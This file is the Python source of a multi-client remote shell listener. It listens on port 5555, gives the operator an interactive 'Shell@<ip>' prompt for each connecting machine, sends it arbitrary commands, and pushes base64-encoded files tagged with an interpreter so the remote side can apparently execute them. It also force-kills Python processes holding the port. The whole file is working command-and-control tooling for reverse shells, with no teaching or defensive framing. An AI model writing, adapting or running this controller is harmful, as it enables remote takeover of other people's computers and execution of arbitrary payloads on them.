import socket
import base64
import subprocess
import os
import threading
import sys
import platform

# Color codes
BLUE = '\033[94m'
RESET = '\033[0m'

def kill_python_processes_on_port(port):
    """Kill any Python processes using the specified port"""
    try:
        if platform.system() == 'Linux':
            # Find and kill Python processes using the port on Linux
            try:
                # Get PIDs of processes using the port
                cmd = f"lsof -ti:{port}"
                pids = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, text=True).strip()
                
                if pids:
                    print(f"[*] Found processes using port {port}: {pids}")
                    
                    # Check if each process is Python and kill it
                    for pid in pids.split('\n'):
                        pid = pid.strip()
                        if pid:
                            try:
                                # Check process name
                                process_name = subprocess.check_output(
                                    f"ps -p {pid} -o comm=", 
                                    shell=True, 
                                    stderr=subprocess.PIPE, 
                                    text=True
                                ).strip()
                                
                                if 'python' in process_name.lower():
                                    print(f"[*] Killing Python process {pid}")
                                    subprocess.run(f"kill -9 {pid}", shell=True, check=True)
                            except subprocess.CalledProcessError:
                                print(f"[-] Failed to kill process {pid}")
            except subprocess.CalledProcessError:
                print(f"[-] No processes found using port {port}")
                
        elif platform.system() == 'Windows':
            # Find and kill Python processes using the port on Windows
            try:
                # Get PIDs of processes using the port
                cmd = f"netstat -ano | findstr :{port}"
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, text=True)
                
                for line in output.split('\n'):
                    line = line.strip()
                    if line:
                        parts = line.split()
                        if len(parts) >= 5:
                            pid = parts[-1]
                            try:
                                # Check if it's a Python process
                                process_cmd = f"tasklist /FI \"PID eq {pid}\" /FO CSV /NH"
                                process_output = subprocess.check_output(
                                    process_cmd, 
                                    shell=True, 
                                    stderr=subprocess.PIPE, 
                                    text=True
                                )
                                
                                if 'python.exe' in process_output.lower():
                                    print(f"[*] Killing Python process {pid}")
                                    subprocess.run(f"taskkill /PID {pid} /F", shell=True, check=True)
                            except subprocess.CalledProcessError:
                                print(f"[-] Failed to kill process {pid}")
            except subprocess.CalledProcessError:
                print(f"[-] No processes found using port {port}")
        else:
            print(f"[-] Unsupported platform: {platform.system()}")
    except Exception as e:
        print(f"[-] Error killing processes: {str(e)}")

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        while True:
            # Get user input
            cmd = input(f"{BLUE}Shell@{addr[0]}{RESET}> ")
            if cmd.lower() == 'exit':
                conn.sendall(b'exit')
                break
            elif cmd.startswith('sendfile'):
                # Format: sendfile <interpreter> <filename>
                parts = cmd.split(' ', 2)
                if len(parts) < 3:
                    print("[-] Usage: sendfile <interpreter> <filename>")
                    continue
                
                interpreter = parts[1]
                filename = parts[2]
                
                try:
                    with open(filename, 'rb') as f:
                        file_data = f.read()
                    
                    # Create command: FILE|<interpreter>|<filename>|<base64_data>
                    b64_data = base64.b64encode(file_data).decode()
                    full_cmd = f"FILE|{interpreter}|{filename}|{b64_data}"
                    conn.sendall(full_cmd.encode())
                    
                except Exception as e:
                    print(f"[-] File error: {str(e)}")
                    continue
            else:
                # Regular command
                conn.sendall(f"CMD|{cmd}".encode())
            
            # Receive response
            response = b''
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                response += data
                if len(data) < 4096:
                    break
            
            print(response.decode())
    except Exception as e:
        print(f"[-] Error: {str(e)}")
    finally:
        conn.close()
        print(f"[-] Connection closed: {addr}")

def start_server(host, port):
    # Kill any Python processes using the port
    print(f"[*] Checking for processes using port {port}")
    kill_python_processes_on_port(port)
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((host, port))
        server.listen(10)  # Increased backlog for more connections
        print(f"[*] Listening on {host}:{port}")
        
        try:
            while True:
                conn, addr = server.accept()
                # Start a new thread for each client
                client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
        finally:
            server.close()
            print("[*] Server closed")
            sys.exit(0)
    except OSError as e:
        if e.errno == 98:  # Address already in use
            print(f"[-] Port {port} is already in use. Try killing the process manually.")
        else:
            print(f"[-] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    HOST = '0.0.0.0'
    PORT = 5555
    start_server(HOST, PORT)
